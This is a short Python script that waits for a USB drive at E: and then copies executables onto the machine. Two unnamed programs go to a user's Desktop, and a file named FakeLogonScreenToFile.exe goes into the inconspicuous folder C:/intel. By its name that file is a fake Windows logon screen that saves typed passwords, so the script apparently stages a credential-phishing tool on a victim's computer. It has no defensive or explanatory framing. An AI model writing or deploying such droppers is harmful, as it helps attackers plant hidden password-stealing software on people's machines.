import shutil
import os
from time import sleep


def wait_for_usb(original_path):
    while True:
        if os.path.isdir(original_path):
            print("USB driver connected!")
            target_path1 = "C:/Users/maki/Desktop"
            target_path2 = "C:/intel"
            if os.path.exists(original_path):
                if os.path.exists(target_path1) and os.path.exists(target_path2):
                    shutil.copy2(f"{original_path}/MAP1.exe", f"{target_path1}/MAP1.exe")
                    shutil.copy2(f"{original_path}/MAP2.exe", f"{target_path1}/MAP2.exe")
                    shutil.copy2(f"{original_path}/FakeLogonScreenToFile.exe", f"{target_path2}/FakeLogonScreenToFile.exe")
                    print("file transferred successfully!")
                    break
        else:
            print("Waiting for connection...")
            sleep(3)


wait_for_usb("E:")
